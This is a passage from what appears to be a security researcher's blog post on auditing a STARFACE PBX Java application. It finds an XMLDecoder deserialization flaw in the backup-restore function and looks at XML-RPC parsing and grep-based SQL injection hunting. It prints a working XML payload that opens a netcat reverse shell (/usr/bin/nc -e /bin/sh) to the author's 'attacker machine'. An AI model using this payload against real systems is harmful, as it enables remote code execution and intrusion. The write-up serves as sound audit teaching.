+&lt;span class=&quot;cm&quot;&gt;/* 40 */&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;manifest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Manifest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;--- Ouch!!&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 41 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 42 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 
+&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And here we had found it: our &lt;strong&gt;fast RCE&lt;/strong&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XmlDecoder.readObject&lt;/code&gt; is a well-known “friend” for Java code auditors because it allows instant code execution without any restrictions to class paths or so as it is known for other unmarshalling/deserialization flaws.&lt;/p&gt;
+
+&lt;p&gt;Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt; option came preinstalled on the vendor’s virtual machine, this was a quick win.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;java&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;version=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1.8.0_292&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;java.beans.XMLDecoder&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;object&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;java.lang.Runtime&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;getRuntime&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;void&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;array&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;java.lang.String&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;length=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;5&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;void&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;index=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+              &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;/usr/bin/nc&lt;span class=&quot;nt&quot;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;void&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;index=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+              &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;-e&lt;span class=&quot;nt&quot;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;void&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;index=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+              &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;/bin/sh&lt;span class=&quot;nt&quot;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;void&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;index=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+              &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;192.168.2.100&lt;span class=&quot;nt&quot;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- my attacker machine --&amp;gt;&lt;/span&gt;
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;void&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;index=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;4&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+              &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;1337&lt;span class=&quot;nt&quot;&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/array&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+ &lt;span class=&quot;nt&quot;&gt;&amp;lt;/object&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/java&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Honestly, when I was first browsing through the code to check for how the ZIP file content was processed, I rather thought about an XML External Entity (XXE) flaw but this was even better and a lot easier. Building a fake backup ZIP file with the malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manifest.xml&lt;/code&gt; was quickly done and handed over to the restore function to prove the RCE.&lt;/p&gt;
+
+&lt;h1 id=&quot;unprivileged-user-attack-surface&quot;&gt;Unprivileged User Attack Surface&lt;/h1&gt;
+
+&lt;p&gt;Until then, we failed in looking for &lt;strong&gt;unauthenticated endpoints&lt;/strong&gt; being vulnerable for anything relevant. &lt;em&gt;Remark: I did explain above that one should map all the URL patterns against Java Servlets and Filters described in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; which to this date, I did not. There might be some unseen attack surface!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;But since this blog post is not about the latest and coolest new RCEs but rather giving a walk-through over my whole security audit process, we proceed with the next category: &lt;em&gt;Searching for vulnerable actions as unprivileged user&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;We begin with a biased trigger of my simple mind by the abbreviation &lt;strong&gt;RPC&lt;/strong&gt; (Remote Procedure Call). This usually reminds me of a lot of vulnerabilities in the past. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; indeed revealed something similar.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;XmlRpcServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/xml-rpc&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;XmlRpcServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;de.starface.com.rpc.xmlrpc.http.XmlRpcServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;authConverterFactory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;de.starface.integration.uci.ucp.connectors.UrlAccountAuthTokenConverterFactory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;useAuthenticationReporter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;true&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So I had a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.starface.com.rpc.xmlrpc.http.XmlRpcServlet.doPost(HttpServletRequest, HttpServletResponse)&lt;/code&gt; first. Obviously, the next code snippet showed, something received and &lt;strong&gt;parsed&lt;/strong&gt; XML-based data from an HTTP request.&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/* 151 */&lt;/span&gt;       &lt;span class=&quot;nc&quot;&gt;HttpXmlRpcObjectParser&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpXmlRpcObjectParser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;       
+&lt;span class=&quot;cm&quot;&gt;/* 153 */&lt;/span&gt;       &lt;span class=&quot;nc&quot;&gt;HttpXmlRpcRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpRequest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpXmlRpcRequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseStreamAsServer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;-- req being a HttpServletRequest&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;       
+&lt;span class=&quot;cm&quot;&gt;/* 155 */&lt;/span&gt;       &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;returnValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;executor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpRequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMethodName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpRequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameters&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; 
+&lt;span class=&quot;cm&quot;&gt;/* 156 */&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;determineUrlFromCaller&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We landed at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.starface.com.rpc.xmlrpc.http.HttpXmlRpcObjectParser.parse(InputStream, boolean)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/* 68 */&lt;/span&gt;       &lt;span class=&quot;nc&quot;&gt;XmlPullParser&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pullParser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MXParser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 69 */&lt;/span&gt;       &lt;span class=&quot;nc&quot;&gt;BufferedReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BufferedReader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InputStreamReader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 70 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;pullParser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setFeature&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://xmlpull.org/v1/doc/features.html#process-namespaces&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 71 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;pullParser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setInput&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;       
+&lt;span class=&quot;cm&quot;&gt;/* 73 */&lt;/span&gt;       &lt;span class=&quot;nc&quot;&gt;HttpXmlRpcObjectBuilder&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objectBuilder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpXmlRpcObjectBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 74 */&lt;/span&gt;       &lt;span class=&quot;nc&quot;&gt;XmlRpcObjectParser&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objectParser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;XmlRpcObjectParser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objectBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;query&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*    */&lt;/span&gt;       
+&lt;span class=&quot;cm&quot;&gt;/* 76 */&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;objectParser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pullParser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Interestingly, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.xmlpull.mxp1.MXParser&lt;/code&gt; was totally unknown to me at this time (and somehow is still today). If you’re familiar with &lt;strong&gt;XXE&lt;/strong&gt; vulnerabilities, this should activate your “vulnerability detection brain cells” (still to be discovered by neuroscientists). There was even an XML parsing feature explicitly activated programmatically: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setFeature(&quot;http://xmlpull.org/v1/doc/features.html#process-namespaces&quot;, true)&lt;/code&gt;. That &lt;em&gt;could&lt;/em&gt; mean that all the other dangerous parsing features wouldn’t be active and therefore not exploitable. Searching for the proper JAR file in the VM file system revealed a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xmlpull-1.1.3.1.jar&lt;/code&gt;. First information on a Java library could be found on the project website or the &lt;em&gt;Maven Repository website&lt;/em&gt; &lt;a href=&quot;https://mvnrepository.com/artifact/xmlpull/xmlpull&quot;&gt;https://mvnrepository.com/artifact/xmlpull/xmlpull&lt;/a&gt;. Version &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.1.3.1&lt;/code&gt; had a release date of 2017, another interesting indicator! No CVEs or publicly known vulnerabilities for this library were found. My recommendation would then be: &lt;em&gt;building a toy project&lt;/em&gt; to play with. I didn’t do this, yet. So this might be another side project anyone could start and then blog about it (*hint*).&lt;/p&gt;
+
+&lt;h1 id=&quot;top-down-vs-bottom-up&quot;&gt;Top-Down vs. Bottom-Up&lt;/h1&gt;
+
+&lt;p&gt;So far, I explained finding vulnerabilities by a kind of &lt;strong&gt;Top-Down&lt;/strong&gt; approach but everybody is talking about using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; to find the juicy stuff, right? Well, that’s also what I’m doing but I try to hold myself back until I already got a good overview on the attack surface and I definitely understand what the application is doing from a functional and technical point of view. You could have started with something like this in the beginning&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rl&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'readObject()'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--include&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'*.java'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and maybe would have even found the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XmlReader&lt;/code&gt; RCE. But I always suggest to not accelerate to full speed at the beginning. You will make your security code audit inefficient and also hit your frustration boundary a lot faster!&lt;/p&gt;
+
+&lt;p&gt;So what are examples for the &lt;strong&gt;Bottom-Up&lt;/strong&gt; approach? Basically, I constantly maintain a list of keywords for dangerous functions, objects etc. for different programming languages: command injections, SQL injections, XXE, deserialization and more.&lt;/p&gt;
+
+&lt;p&gt;I’ll just give one example I used: SQL injection.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ril&lt;/span&gt; executeQuery | xargs &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Li&lt;/span&gt; preparedstatement &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;executeQuery&lt;/code&gt; is a well-known method name for executing SQL queries for various Java SQL APIs. The same is true for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreparedStatement&lt;/code&gt; keyword: our enemy, because we don’t “want” them to use Prepared SQL Statements but rather things like good old plain string concatenation.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ril&lt;/span&gt; executeQuery | xargs &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Li&lt;/span&gt; preparedstatement &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;
+com/microsoft/sqlserver/jdbc/SQLServerBulkCopy.java
+com/microsoft/sqlserver/jdbc/SQLServerXAResource.java
+com/microsoft/sqlserver/jdbc/SQLServerStatement.java
+com/mysql/cj/jdbc/StatementWrapper.java
+com/mysql/cj/jdbc/admin/TimezoneDump.java
+com/mysql/cj/jdbc/MysqlXAConnection.java
+com/mysql/cj/jdbc/integration/c3p0/MysqlConnectionTester.java
+com/mysql/cj/jdbc/interceptors/ServerStatusDiffInterceptor.java
+de/vertico/starface/phonesetup/adapter/PattonAdapter.java
+de/vertico/starface/phonesetup/adapter/DefaultPhoneHttpAdapter.java
+de/vertico/starface/persistence/connector/StatisticsHandler.java &lt;span class=&quot;c&quot;&gt;# well check this&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We definitely got a long list of hits. These could have been all &lt;em&gt;false positives&lt;/em&gt; but also we might had &lt;strong&gt;missed&lt;/strong&gt; a lot. Why? Because if one Java source file would have contained &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; SQL execute statements with Prepared Statements and just &lt;strong&gt;one of them&lt;/strong&gt; would have used string concatenation being vulnerable to SQL injection, we would have missed it. So be careful about what your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; command does &lt;strong&gt;in detail&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let’s have a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.vertico.starface.persistence.connector.StatisticsHandler&lt;/code&gt;.
+The first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;executeQuery&lt;/code&gt; was used in this method:&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*      */&lt;/span&gt;   &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ResultSet&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getLineUsageData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Connection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;con&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;accountCategory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;groupId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;directionCategory&lt;/span&gt;&lt;span 